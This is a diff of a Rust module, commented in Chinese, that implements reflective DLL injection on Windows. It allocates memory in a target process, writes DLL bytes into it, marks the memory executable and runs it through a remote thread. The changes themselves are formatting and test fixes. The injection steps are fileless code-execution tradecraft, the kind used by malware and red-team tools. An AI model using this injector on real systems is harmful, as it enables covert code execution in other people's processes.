@@ -3,11 +3,11 @@
 // 这实现了反射式DLL注入，允许在不接触磁盘的情况下在目标进程中加载DLL。
 // DLL从内存中直接映射到目标进程的地址空间。
 
-use anyhow::{Result, Context, bail};
-use windows::Win32::System::Memory::*;
-use super::process::TargetProcess;
 use super::memory::MemoryManager;
+use super::process::TargetProcess;
 use crate::ffi;
+use anyhow::{bail, Context, Result};
+use windows::Win32::System::Memory::*;
 
 /// Reflective Loader 配置
 pub struct ReflectiveLoaderConfig {
@@ -70,13 +70,14 @@ impl ReflectiveLoader {
         // 1. 验证DLL
         self.validate_dll()?;
 
-        let memory_mgr = MemoryManager::new_from_handle(target_process.process_handle);
+        let _memory_mgr = MemoryManager::new_from_handle(target_process.process_handle);
 
         // 2. 在目标进程中分配内存来存储DLL
         let dll_address = ffi::allocate_virtual_memory_ex(
             target_process.process_handle,
             self.config.dll_bytes.len(),
-        ).context("Failed to allocate memory for DLL in target process")?;
+        )
+        .context("Failed to allocate memory for DLL in target process")?;
 
         if self.config.verbose {
             eprintln!("[*] Allocated memory at: 0x{:X}", dll_address as usize);
@@ -87,10 +88,14 @@ impl ReflectiveLoader {
             target_process.process_handle,
             dll_address,
             &self.config.dll_bytes,
-        ).context("Failed to write DLL to target process")?;
+        )
+        .context("Failed to write DLL to target process")?;
 
         if self.config.verbose {
-            eprintln!("[*] Wrote {} bytes of DLL data", self.config.dll_bytes.len());
+            eprintln!(
+                "[*] Wrote {} bytes of DLL data",
+                self.config.dll_bytes.len()
+            );
         }
 
         // 4. 设置内存为可执行
@@ -99,7 +104,8 @@ impl ReflectiveLoader {
             dll_address,
             self.config.dll_bytes.len(),
             PAGE_EXECUTE_READ,
-        ).context("Failed to set memory protection")?;
+        )
+        .context("Failed to set memory protection")?;
 
         if self.config.verbose {
             eprintln!("[*] Set memory protection to PAGE_EXECUTE_READ");
@@ -114,7 +120,7 @@ impl ReflectiveLoader {
     pub fn execute_dll(
         &self,
         target_process: &TargetProcess,
-        dll_address: *mut u8,
+        _dll_address: *mut u8,
         param: Option<&[u8]>,
     ) -> Result<u32> {
         // 创建远程线程来执行DLL代码
@@ -170,21 +176,20 @@ impl DLLInjector {
             bail!("Invalid PE format");
         }
 
-        Ok(Self { dll_data: dll_bytes })
+        Ok(Self {
+            dll_data: dll_bytes,
+        })
     }
 
     /// 从文件加载DLL
     pub fn from_file(path: &str) -> Result<Self> {
-        let dll_bytes = std::fs::read(path)
-            .context(format!("Failed to read DLL file: {}", path))?;
+        let dll_bytes =
+            std::fs::read(path).context(format!("Failed to read DLL file: {}", path))?;
         Self::from_bytes(dll_bytes)
     }
 
     /// 使用反射加载器注入
-    pub fn inject_reflective(
-        &self,
-        target_process: &TargetProcess,
-    ) -> Result<*mut u8> {
+    pub fn inject_reflective(&self, target_process: &TargetProcess) -> Result<*mut u8> {
         let loader = ReflectiveLoader::new(self.dll_data.clone()).with_verbose(false);
         loader.inject_into_process(target_process)
     }
@@ -216,7 +221,9 @@ mod tests {
     #[test]
     fn test_pe_validation() {
         // 有效的MZ头
-        let valid_pe = vec![b'M', b'Z', 0; 64];
+        let mut valid_pe = vec![0u8; 64];
+        valid_pe[0] = b'M';
+        valid_pe[1] = b'Z';
         let loader = ReflectiveLoader::new(valid_pe);
         assert!(loader.validate_dll().is_ok());
     }
@@ -224,7 +231,9 @@ mod tests {
     #[test]
     fn test_invalid_pe_header() {
         // 无效的MZ头
-        let invalid_pe = vec![b'X', b'X', 0; 64];
+        let mut invalid_pe = vec![0u8; 64];
+        invalid_pe[0] = b'X';
+        invalid_pe[1] = b'X';
         let loader = ReflectiveLoader::new(invalid_pe);
         assert!(loader.validate_dll().is_err());
     }
@@ -239,14 +248,18 @@ mod tests {
 
     #[test]
     fn test_dll_injector_creation() {
-        let pe_data = vec![b'M', b'Z', 0; 128];
+        let mut pe_data = vec![0u8; 128];
+        pe_data[0] = b'M';
+        pe_data[1] = b'Z';
         let injector = DLLInjector::from_bytes(pe_data);
         assert!(injector.is_ok());
     }
 
     #[test]
     fn test_dll_injector_invalid_format() {
-        let invalid_data = vec![0xFF, 0xFF, 0; 128];
+        let mut invalid_data = vec![0u8; 128];
+        invalid_data[0] = 0xFF;
+        invalid_data[1] = 0xFF;
         let injector = DLLInjector::from_bytes(invalid_data);
         assert!(injector.is_err());
     }
